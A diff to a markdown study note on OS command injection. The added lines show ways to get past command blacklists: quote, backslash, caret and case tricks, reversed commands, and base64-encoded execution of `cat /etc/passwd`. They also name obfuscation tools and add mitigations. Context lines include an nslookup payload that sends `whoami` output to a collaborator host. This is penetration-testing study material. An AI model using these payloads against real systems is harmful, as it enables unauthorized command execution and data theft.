@@ -103,6 +103,7 @@ x||nslookup `whoami`.<burp-collab-payload>||
 
 Blacklists prevent certain characters or words from being accepted as input. However, this isn't the beste defence mechanism as there are many replacements and substitutions we can use instead.
 
+> All techniques are explained [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection).
 #### Space
 
 If the space is blacklisted, these are other options:
@@ -135,6 +136,76 @@ $(tr '!-}' '"-~'<<<[)
 ```
 > Simply replace the `[` with another character that is directly before a desired character.
 
+#### Commands
+
+If certain commands are blacklisted, then are there are techniques used to obfuscate them but still let them achieve their intended purpose.
+
+1. If the application is checking for an exact word match, sending the same command but obfuscated will pass through this check.
+
+* Linux/Windows: Inserting `'` or `"` in between the command characters.
+```bash
+wh'oa'mi
+w"h"o"a"mi
+```
+> Qoute types cannot be mixed, and their number must be even, not odd.
+
+* Linux only: Insert `\` or `$@` in between the command characters.
+```bash
+who\a\m\i
+who$@ami
+```
+> If these characters are filtered, use the environment variables technique to get these characters first and then place them inside the command.
+
+* Windows only: Insert `^` in between the command characters.
+```cmd
+who^ami
+```
+
+* Case manipulation. Blacklists might not check all case versions of a word.
+1. Inverting the entire case. (All caps)
+2. Alternating between cases.
+```bash
+WHOAMI
+wHoAmI
+```
+
+> For linux and bash shells, commands are case sensitive. Therefore, we need to return them to their original case.
+
+```bash
+$(tr "[A-Z]" "[a-z]"<<<"WHOAMI")
+```
+
+* Reversed commands. First we get the reverse of the command we want, then we can send the reversed command with some reversing functionality that returns it back to normal.
+1. Linux
+```bash
+echo 'whoami' | rev  # outputs imaohw
+$(rev<<<'imaohw') 
+```
+2. Windows powershell
+```bash
+"whoami"[-1..-20] -join '' # outputs imaohw
+iex "$('imaohw'[-1..-20] -join '')"
+```
+
+* Encoding the commands, this can be used to evade firewalls and filters. First we get the encoding, then we can send the encoding with its decoding functionality.
+
+```bash
+echo 'cat /etc/passwd' | base64   # outputs the base64 encoding of this command.
+bash<<<$(base64 -d<<<_encoding_here_)
+```
+
+---
+
+### Automated Tools
+
+These tools perform advanced obfuscation techniques that we cannot do in a manual fashion. 
+##### [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
+
+This is a linux tool that picks random obfuscation technique. We can specify what we need using flags.
+##### [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)
+
+This is a windows tool that is interactive. 
+
 ---
 ### Useful Commands
 
@@ -154,5 +225,11 @@ $(tr '!-}' '"-~'<<<[)
 * If that is not the case, then strong input validationr required.
 	* Validating against whitelist.
 	* Validating data type.
+* Input sanitization and validation.
+* Server configuration.
+	* Limit the scope of accessibility by the web application.
+	* Reject requests with encodings.
+	* Use web application [[Firewall]]s.
+	* Run the web server as a low privileged user.
 
 ---
